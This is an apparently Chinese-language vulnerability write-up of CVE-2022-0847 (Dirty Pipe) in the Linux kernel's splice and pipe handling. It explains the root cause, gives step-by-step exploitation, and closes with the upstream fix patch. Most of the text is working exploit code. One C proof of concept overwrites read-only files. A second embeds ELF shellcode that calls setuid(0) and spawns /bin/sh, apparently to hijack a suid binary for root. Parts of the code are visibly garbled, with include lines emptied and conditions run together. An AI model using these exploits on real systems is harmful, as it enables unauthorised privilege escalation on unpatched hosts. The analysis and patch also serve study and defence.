@@ -1,0 +1,194 @@
+`do_splice_from` 最终会调用对应内核文件结构的函数表中的 `splice_write()` 指针，将 pipe_buffer
+数组对应页面上内容读出，写入到文件中，对于不同的文件系统而言该函数指针不同
+    /*
+     * Attempt to initiate a splice from pipe to file.
+     */
+    static long do_splice_from(struct pipe_inode_info *pipe, struct file *out,
+                   loff_t *ppos, size_t len, unsigned int flags)
+    {
+        if (unlikely(!out->f_op->splice_write))
+            return warn_unsupported(out, "write");
+        return out->f_op->splice_write(pipe, out, ppos, len, flags);
+    }
+以 ext4 文件系统为例，最终会调用到 `iter_file_splice_write` 函数，之后存在如下调用链：
+    iter_file_splice_write(）
+        splice_from_pipe_next() // 检查管道可用性
+        vfs_iter_write()    // 读出管道数据写入文件
+            do_iter_write()
+                do_iter_readv_writev()
+                    call_write_iter // 上层传入type为 WRITE，走入该分支
+`call_write_iter` 是文件函数表中 `write_iter()` 的 wrapper，对 ext4 而言对应调用
+`ext4_file_write_iter`，这里最终只是常规的将 buf 上数据拷贝到文件上的操作，也并非本篇的重点，就不展开分析了
+# 0x01.漏洞分析
+我们咋一看好像并没有什么问题，但让我们思考这样一个情景：
+  * 我们将管道整个读写了一轮，此时所有的 pipe_buffer 都保留了 `PIPE_BUF_FLAG_CAN_MERGE` 标志位
+  * 我们利用 splice 将数据从文件读取一个字节到管道上，此时 pipe_buffer 对应的 page 成员 **指向文件映射的页面** ，但在 splice 中 **并未清空 pipe_buffer 的标志位，从而让内核误以为该页面可以被写入**
+  * 在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而 **将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面** ，由于 `PIPE_BUF_FLAG_CAN_MERGE` 仍保留着，因此 **内核会误以为该页面可以被写入** ，从而完成了越权写入文件的操作
+漏洞点便是在于 splice 系统调用中 **未清空** `pipe_buffer` **的标志位，从而将管道页面可写入的状态保留了下来**
+，这给了我们越权写入只读文件的操作
+我们不难发现这个漏洞与脏牛十分类似，都是能越权对文件进行写入，不同的是脏牛需要去撞条件竞争的概率，而该漏洞 **可以稳定触发**
+，但是脏牛可以直接写整个文件，而 **该漏洞不能在管道边界上写入**
+> 当然，如果这个文件甚至都是不可读的，那自然是没法利用的（笑），但在主流 Linux 发行版中有着大量的可作为我们攻击目标的文件，例如 suid 程序或
+> `/etc/passwd` 等
+# 0x02.漏洞利用
+漏洞利用的步骤其实我们在前面都已经叙述得差不多了，主要就是分三步走：
+## Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag
+为了保证利用能够稳定成功，我们首先新建一个管道， **将管道写满后再将所有数据读出** ，这样管道的每一个 `pipe_buffer` 都会被设置上
+`PIPE_BUF_FLAG_CAN_MERGE` 标志位
+## Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）
+接下来我们使用 splice 系统调用将数据从目标文件中读入到管道，从而让 `pipe_buffer->page`
+变为文件在内存中映射的页面，为了让下一次写入数据时写回文件映射的页面，我们应当 **读入不多于一个数据的页面** ，这里笔者选择读入 1
+个字节，这样我们仍能向文件上写入将近一张页面的数据
+当我们完成读入之后，管道的 head 指向下一个 pipe_buffer，因此我们若要写入文件则应当走入到 pipe_write 开头写入上一个
+pipe_buffer 的分支，这也是为什么我们在这里只读入一个字节的缘故
+## Step.III 向管道中写入恶意数据，完成越权写入文件
+接下来 **我们直接向管道中写入数据就能完成对只读文件的越权写入** 。在 splice 中建立完页面映射后，此时 head 会指向下一个
+pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而 **将数据拷贝到上一个
+pipe_buffer 对应的页面——即文件映射的页面** ，由于 `PIPE_BUF_FLAG_CAN_MERGE` 仍保留着，因此
+**内核会误以为该页面可以被写入** ，从而完成了越权写入文件的操作
+## poc
+我们使用 qemu 起一个测试环境，看看是否能够利用该漏洞对只读文件进行写入，最终的 poc 如下：
+    /*
+     * POC of CVE-2022-0847
+     * written by arttnba3
+     */
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    void errExit(char * msg)
+    {
+        printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    int main(int argc, char **argv, char **envp)
+    {
+        long            page_size;
+        size_t          offset_in_file;
+        size_t          data_size;
+        int             target_file_fd;
+        struct stat     target_file_stat;
+        int             pipe_fd[2];
+        int             pipe_size;
+        char            *buffer;
+        int             retval;
+        // checking before we start to exploit
+        if (argc  target_file_stat.st_size)
+            errExit("Offset is not in the file!");
+        data_size = strlen(argv[3]);
+        if ((offset_in_file + data_size) > target_file_stat.st_size)
+            errExit("Cannot enlarge the file!");
+        if (((offset_in_file % page_size) + data_size) > page_size)
+            errExit("Cannot write accross a page!");
+        // exploit now...
+        puts("\033[34m\033[1m[*] Start exploiting...\033[0m");
+        /*
+         * prepare the pipe, make every pipe_buffer a MERGE flag
+         * Just write and read through
+         */
+        puts("\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m");
+        pipe(pipe_fd);
+        pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
+        buffer = (char*) malloc(page_size);
+        for (int size_left = pipe_size; size_left > 0; )
+        {
+            int per_write = size_left > page_size ? page_size : size_left;
+            size_left -= write(pipe_fd[1], buffer, per_write);
+        }
+        for (int size_left = pipe_size; size_left > 0; )
+        {
+            int per_read = size_left > page_size ? page_size : size_left;
+            size_left -= read(pipe_fd[0], buffer, per_read);
+        }
+        puts("\033[32m\033[1m[+] Flag setting has been done.\033[0m");
+        /*
+         * Use the splice to make the pipe_buffer->page
+         * become the page of the file mapped, by read
+         * a byte from the file accross the splice
+         */
+        puts("\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m");
+        offset_in_file--;   // we read a byte, so offset should minus 1
+        retval = splice(target_file_fd, &offset_in_file, pipe_fd[1], NULL, 1, 0);
+        if (retval 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    unsigned char shellcode[] = {
+        0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62,
+        0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x5e,
+        0x6a, 0x3b, 0x58, 0x0f, 0x05
+    };
+    unsigned int shellcode_len = 149;
+    void errExit(char * msg)
+    {
+        printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    int main(int argc, char **argv, char **envp)
+    {
+        long            page_size;
+        size_t          offset_in_file;
+        size_t          data_size;
+        int             target_file_fd;
+        int             pipe_fd[2];
+        int             pipe_size;
+        char            *buffer;
+        int             retval;
+        // checking before we start to exploit
+        if (argc  0; )
+        {
+            int per_write = size_left > page_size ? page_size : size_left;
+            size_left -= write(pipe_fd[1], buffer, per_write);
+        }
+        for (int size_left = pipe_size; size_left > 0; )
+        {
+            int per_read = size_left > page_size ? page_size : size_left;
+            size_left -= read(pipe_fd[0], buffer, per_read);
+        }
+        puts("\033[32m\033[1m[+] Flag setting has been done.\033[0m");
+        /*
+         * Use the splice to make the pipe_buffer->page
+         * become the page of the file mapped, by read
+         * a byte from the file accross the splice
+         */
+        puts("\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m");
+        offset_in_file--;   // we read a byte, so offset should minus 1
+        retval = splice(target_file_fd, &offset_in_file, pipe_fd[1], NULL, 1, 0);
+        if (retval flags` 的代码添加上将 flag 置 0 的代码即可，除了
+`copy_page_to_iter_pipe` 以外在 `push_pipe` 中也缺失了置 0 的代码，补充上即可：
+    diff --git a/lib/iov_iter.c b/lib/iov_iter.c
+    index b0e0acdf96c1..6dd5330f7a99 100644
+    --- a/lib/iov_iter.c
+    +++ b/lib/iov_iter.c
+    @@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
+            return 0;
+        buf->ops = &page_cache_pipe_buf_ops;
+    +   buf->flags = 0;
+        get_page(page);
+        buf->page = page;
+        buf->offset = offset;
+    @@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
+                break;
+            buf->ops = &default_pipe_buf_ops;
+    +       buf->flags = 0;
+            buf->page = page;
+            buf->offset = 0;
+            buf->len = min_t(ssize_t, left, PAGE_SIZE);
+> 参见[linux-kernel.vger.kernel.org archive mirror](
